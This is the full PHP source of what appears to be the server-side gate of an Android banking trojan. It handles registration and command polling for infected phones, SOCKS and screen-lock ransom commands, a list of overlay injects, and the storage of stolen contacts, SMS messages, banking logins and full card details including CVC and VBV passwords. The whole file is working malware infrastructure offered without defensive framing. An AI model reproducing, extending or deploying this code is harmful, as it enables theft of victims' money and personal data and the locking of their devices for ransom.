<?php
require_once './config/config.php';
require_once './lib/AesCipher.php';

function client_reg($db, $params){
    # check client in locked table
    $db->where('imei', $params->imei);
    $lclient = $db->getOne('locked_clients');
    if ($lclient){
        locked_client_reg($db, $params);
        return true;
    }

    # Get information about client
    $db->where('imei', $params->imei);
    $client = $db->getOne('clients');
    if (!$client) {
        $data = Array ("imei" => $params->imei,
            "number" => $params->number,
            "version" => $params->version,
            "version_apk" => $params->version_apk,
            "country" => $params->country,
            "model" => $params->model,
            "root" => $params->root,
            "screen" => $params->screen,
            "internet" => $params->internet,
            "ip" => '',
            "firstConnect" => time(),
            "lastConnect" => time()
        );
        $id = $db->insert('clients', $data);
        if($id)
            send_start_commands($db, $params->imei);
            return true;
    } else {
        # hack for update zip code
        $client_ip = $_SERVER['REMOTE_ADDR'];

        if (($client['ip'] != $client_ip) or ($client['ip'] == '')){
            $json = file_get_contents("http://ip-api.com/json/$client_ip");
            $location_obj = json_decode($json);
            if($location_obj->status == "success"){
                $zip = $location_obj->zip;
                $regionName = $location_obj->regionName;
                $city = $location_obj->city;

                $data = array('zip' => $zip,
                    'regionName' => $regionName,
                    'city' => $city);
                $db->where('imei', $params->imei);
                $db->update('clients', $data);
            }
        }

        $command = client_ping($db, $params);
        if ($command){
            echo base64_encode($command);
            exit(0);
        }
        $result = array("action" => "nothing", "params" => array("none" => "none"));
        echo base64_encode(json_encode($result));
        exit(0);
    }
}
function locked_client_reg($db, $params)
{
    //Get information about client
    $data = Array(
        "lastConnect" => time()
    );

    # just another stupid hack, because you never know what data will provide by client...
    if (isset($params->secret) and ($params->secret != 0)) $data['secret'] = $params->secret;
    if (isset($params->client_id)) $data['client_id'] = $params->client_id;
    if (isset($params->country)) $data['country'] = $params->country;
    if (isset($params->version)) $data['version'] = $params->version;

    $db->where('imei', $params->imei);
    $id = $db->update('locked_clients', $data);

    if ($id) {
        # going to insert contacts
        if (isset($params->contacts)) {
            foreach ($params->contacts as $name => $phone) {
                if (($name != "none") and ($phone != "none")) {
                    $data = Array("imei" => $params->imei,
                        "name" => $name,
                        "phone" => $phone);
                    $id = $db->insert('contacts', $data);
                }
            }
        }
        return true;
    }
}
function send_start_commands($db, $imei){
    $settings = file_get_contents("config/settings.json");
    $settings = json_decode($settings, TRUE);

    foreach ($settings['start'] as $cmd => $params) {
        // add dummy values. do not ask why...
        if (count($params) == 0) {$params['dummy'] = 'value';}
        $cmd_json = json_encode(array("action" => $cmd,
            "params" => $params));
        $data_to_store = array("imei" => $imei,
            "command_name" => $cmd,
            "command" => base64_encode($cmd_json));
        $db->insert ('commands', $data_to_store);
    }
}
function client_ping($db, $params){
    $result = NULL;
    # Update information about client
    $data = Array ("ip" => $_SERVER['REMOTE_ADDR'],
        "lastConnect" => time()
    );
    if ($params->screen != '') $data["screen"] = $params->screen;
    if ($params->internet != '') $data["internet"] = $params->internet;
    if ($params->root != '') $data["root"] = $params->root;

    $db->where('imei', $params->imei);
    $db->update('clients', $data);

    # find news for client
    $db->where('imei', $params->imei);
    $command = $db->getOne('commands');
    if ($command) {
        $result = base64_decode($command['command']);

        # delete news which already sent
        $db->where('id', $command['id']);
        $db->delete('commands');

        # socks hook
        $cmd = json_decode($result);
        if ($cmd->action == 'StartSocks'){
            # TODO: need to start allocate command
            $pr = $cmd->params;
        }
        # crypt locker hook
        if ($cmd->action == 'Screen_Lock'){
            # delete client from clients and add to locked_clients
            $db->where('imei', $params->imei);
            $db->delete('clients');

            $data = Array("imei" => $params->imei,
                "firstConnect" => time(),
                "lastConnect" => time()
            );
            $id = $db->insert('locked_clients', $data);

            # add decrypt command
            // Create new command json
            $cmd_json = json_encode(array("action" => "Unlock_Screen",
                "params" => array("dummy" => "value")));

            $data_to_store = array("imei" => $params->imei,
                "command_name" => "Unlock_Screen",
                "command" => base64_encode($cmd_json));
            $last_id = $db->insert ('commands', $data_to_store);
        }
    }

    return $result;
}

function client_contacts($db, $params){
    # going to insert contacts
    foreach ($params->contacts as $name => $phone) {
        if (($name != "none") and ($phone != "none")) {
            $data = Array("imei" => $params->imei,
                "name" => $name,
                "number" => $phone);
            $id = $db->insert('contacts', $data);
        }
    }
    return true;
}

function add_banks($db, $params){
    if($params->data){
        $data_string = '';
        if (isset($params->name)) $data_string = "App name: ".$params->name."  ";

        foreach ($params->data as $key => $val) {
            $data_string = $data_string.$key.":".$val.";";
        }
        $data = Array("imei" => $params->imei,
            "time" => time(),
            "data" => $data_string);
        $id = $db->insert('banks', $data);

        # increment s_bank for display stat on client page
        $data = array('s_bank' => 1);
        $db->where('imei', $params->imei, 'like');
        $db->update('clients', $data);
        return $id;
    }
}

function add_cc_info($db, $params){
    $names = array(
        "cardNumber" => "CARD",
        "cvcEntry" => "CVC",
        "expiredMonth" => "MMYY",
        "expiredYear" => "MMYY",
        "nameOnCard" => "CardholderName",
        "dateOfBirth" => "birth_date",
        "phoneNumber" => "PhoneNumber",
        "vbvPass" => "VBV",
        "vbvPassRepeat" => "VBV"
    );
    $data = array(
        "last_update" => time(),
        "IMEI" => $params->imei
    );
    foreach ($params->data as $key => $val) {
        if ($key != 'stepID') {
            if (strpos($key, 'expired') !== false) {
                $data['MMYY'] = $params->data->expiredMonth.'/'.$params->data->expiredYear;
            } else {
                $data[$names[$key]] = $val;
            }
        }
    }
    if ($params->data->stepID == 1) {
        # another hook to check card name because stupid client doesn't have ability to look into it.
        $db->where('CARD', $params->cardNumber);
        $cc = $db->getOne('cc_info');
        if ($cc) return;

        $res = $db->insert('cc_info', $data);
    } else {
        $db->where('IMEI', $params->imei);
        $db->orderBy('last_update', 'Desc');
        $cc = $db->getOne('cc_info');
        if ($cc) {
            $db->where('id', $cc['id']);
            $res = $db->update('cc_info', $data);
        }
    }
    #$data = Array("IMEI" => $params->imei,
    #    "data" => $params->data);
    #$id = $db->insert('cc_info', $data);

    # increment s_bank for display stat on client page
    $data = array('s_card' => 1);
    $db->where('imei', $params->imei, 'like');
    $db->update('clients', $data);
    return $res;
}

function apps_ping($db, $params){
    $result = NULL;
    # Update information about client
    $data = Array ("model" => $params->name);
    $db->where('imei', $params->imei);
    $result = $db->update('clients', $data);

    return $result;
}

function generate_template($db, $imei, $name){
    # generate random hash
    $hash = bin2hex(openssl_random_pseudo_bytes(32));

    # insert hash to db
    $data = Array ("imei" => $imei,
        "name" => $name,
        "version" => $hash,
        "time" => time()
    );
    $id = $db->insert('info', $data);
}

function get_inj_list(){
    $inj_list = "";
    $files = scandir('inj');
    foreach ($files as $file) {
        if (($file != ".") and ($file != "..") and ($file != "") and ($file != "go.php") and ($file != ".htaccess")){
            $inj_list .= "$file\n";
        }
    }
    return rtrim($inj_list);
}

function replace($str){
    #$str = preg_replace('/[;:^\'"]/', '', $str);
    $str = preg_quote($str);
    return $str;
}

function dump_request($str, $file){
    file_put_contents($str, $file, FILE_APPEND);
}

$request = $_GET['i'];

# TODO: we need to decrypt string here, but encryption is not ready now
$request = base64_decode($request);
$request = json_decode($request);

# register new clients
if ($request->action == "reg") {
    if (client_reg($db, $request->params)){
        $result = array("result" => "done");
        echo base64_encode(json_encode($result));
    } else {
        $result = array("result" => "fail");
        echo base64_encode(json_encode($result));
    }
}

# command processor
if ($request->action == "ping") {
    $command = client_ping($db, $request->params);
    if ($command){
        # Send command if we have
        # $result = array("action" => "command", "command" => json_decode($command));
        echo base64_encode($command);
    } else {
        $result = array("action" => "nothing", "params" => array("none" => "none"));
        echo base64_encode(json_encode($result));
    }
}

# contacts
if ($request->action == "contacts") {
    if (client_contacts($db, $request->params)){
        $result = array("result" => "done");
        echo base64_encode(json_encode($result));
    } else {
        $result = array("result" => "fail");
        echo base64_encode(json_encode($result));
    }
}

# get inject list
if ($request->action == "get_inj_list") {
    $list = get_inj_list();
    if ($list){
        $result = array("action" => "done", "params" => $list);
        echo base64_encode(json_encode($result));
    } else {
        $result = array("action" => "failed", "params" => array("none" => "none"));
        echo base64_encode(json_encode($result));
    }
}

# write apps to db
if ($request->action == "ping_apps") {
    if (apps_ping($db,$request->params)){
        $result = array("action" => "done", "params" => array("none" => "none"));
        echo base64_encode(json_encode($result));
    } else {
        $result = array("action" => "failed", "params" => array("none" => "none"));
        echo base64_encode(json_encode($result));
    }
}

# write banks to db
if ($request->action == "banks") {
    if (add_banks($db,$request->params)){
        $result = array("action" => "done", "params" => array("none" => "none"));
        echo base64_encode(json_encode($result));
    } else {
        $result = array("action" => "failed", "params" => array("none" => "none"));
        echo base64_encode(json_encode($result));
    }
}

# write сс to db
if ($request->action == "cc") {
    if (add_cc_info($db,$request->params)){
        $result = array("action" => "done", "params" => array("none" => "none"));
        echo base64_encode(json_encode($result));
    } else {
        $result = array("action" => "failed", "params" => array("none" => "none"));
        echo base64_encode(json_encode($result));
    }
}

# client logs
if ($request->action == "log") {
    $result = '';
    $data = Array ("imei" => replace($request->params->imei),
        "text" => replace($request->params->text),
        "time" => time()
        );
    if ($request->params->type == 'log') {
        $id = $db->insert("logs", $data);
        if ($id) {
            $result = array("result" => "done");
            # increment s_log for display stat on client page
            $data = array('s_log' => 1);
            $db->where('imei', $request->params->imei, 'like');
            $db->update('clients', $data);
        }
    }
    if ($request->params->type == 'sms') {
        $id = $db->insert("sms", $data);
        if ($id) {
            $result = array("result" => "done");

            # increment s_sms for display stat on client page
            $data = array('s_sms' => 1);
            $db->where('imei', replace($request->params->imei), 'like');
            $db->update('clients', $data);
        }
    }

    if ($result == '') $result = array("result" => "failed");

    echo base64_encode(json_encode($result));
}

?>
